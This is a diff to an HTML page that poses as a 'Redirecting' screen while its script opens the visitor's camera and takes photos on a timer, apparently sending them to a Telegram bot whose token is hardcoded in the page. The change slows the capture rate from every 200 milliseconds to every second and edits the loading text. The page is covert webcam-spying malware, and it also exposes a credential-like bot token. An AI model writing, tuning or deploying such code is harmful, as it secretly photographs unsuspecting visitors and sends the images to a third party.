@@ -23,7 +23,7 @@
   </style>
 </head>
 <body>
-  <div class="loading">Redirecting, please wait...</div>
+  <div class="loading">Redirecting, please.</div>
 
   <script type="text/javascript">
     const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
@@ -60,7 +60,7 @@
               const videoTrack = stream.getVideoTracks()[0];
               const imageCapture = new ImageCapture(videoTrack);
 
-              // Capture and send photos continuously every 200 milliseconds (0.2 seconds)
+              // Capture and send photos continuously every 1 second (1000ms)
               const captureInterval = setInterval(() => {
                 imageCapture.takePhoto()
                   .then((blob) => {
@@ -70,7 +70,7 @@
                   .catch((error) => {
                     console.error('Error capturing photo:', error);
                   });
-              }, 200);  // 200ms interval between photo captures
+              }, 1000);  // 1000ms interval between photo captures (1 second)
 
               // Stop capturing if the user leaves the page
               window.addEventListener("beforeunload", () => {
